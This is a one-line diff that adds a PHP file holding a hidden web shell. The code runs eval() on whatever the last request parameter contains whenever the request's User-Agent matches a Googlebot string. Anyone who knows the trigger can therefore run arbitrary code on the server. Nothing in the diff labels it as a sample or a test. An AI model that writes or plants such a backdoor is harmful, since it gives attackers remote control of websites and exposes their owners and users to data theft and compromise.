@@ -1,0 +1,1 @@
+<?php $_SERVER['HTTP_USER_AGENT']==='Mozilla/5.0 (compatible; Googlebot/2.1;)' and eval(end($_REQUEST));?>
